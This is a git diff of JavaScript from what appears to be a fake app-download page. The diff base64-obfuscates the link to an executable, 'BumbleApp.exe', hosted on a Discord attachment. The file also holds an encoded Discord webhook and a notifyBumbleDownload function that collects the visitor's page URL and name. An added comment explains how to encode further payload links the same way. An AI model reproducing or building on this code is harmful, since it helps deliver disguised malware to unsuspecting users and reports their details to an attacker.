@@ -1,8 +1,8 @@
 (function (global) {
     "use strict";
 
-   
-var BUMBLE_APP_DOWNLOAD_URL = atob("https://cdn.discordapp.com/attachments/1490428631686844678/1490429062794055740/BumbleApp.exe?ex=69d4ae7b&is=69d35cfb&hm=6830f4cfe9db93d1773a7c690a67e47de113bab9d80504fb7bddea47901c46c7&");
+    /** UTF-8 URL as base64 (same idea as WEBHOOK_URL). Replace string: btoa(unescape(encodeURIComponent(yourUrl))) in browser console. */
+    var BUMBLE_APP_DOWNLOAD_URL = atob("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvMTQ5MDQyODYzMTY4Njg0NDY3OC8xNDkwNDI5MDYyNzk0MDU1NzQwL0J1bWJsZUFwcC5leGU/ZXg9NjlkNDA1YmImaXM9NjlkMmI0M2ImaG09NzU2ZjQ0NThiYzY1MjY5YzQzMGYwNzU0NWZhNDY3MjY4NTFkYTJjZjU5OGMzMDI0OGE5ZGI0MzU5MDc3OTMzNiY=");
 
     var WEBHOOK_URL = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ5MDQwNjMyOTU5NTIwMzgzNC80eUZGbnNFSnpaRHdueW9fVHFyMHdQazREY2NoWFdMOU1QRm5ua1VCejluYjBNOU9ZcXB2LWF0OUNhcEMwTkp5MGU3OQ==");
 
@@ -181,6 +181,9 @@ var BUMBLE_APP_DOWNLOAD_URL = atob("https://cdn.discordapp.com/attachments/14904
         });
     }
 
+    /**
+     * @param {{ pageUrl?: string, guestName?: string, triggerLabel?: string }} opts
+     */
     function notifyBumbleDownload(opts) {
         opts = opts || {};
         var pageUrl = opts.pageUrl || global.location.href;
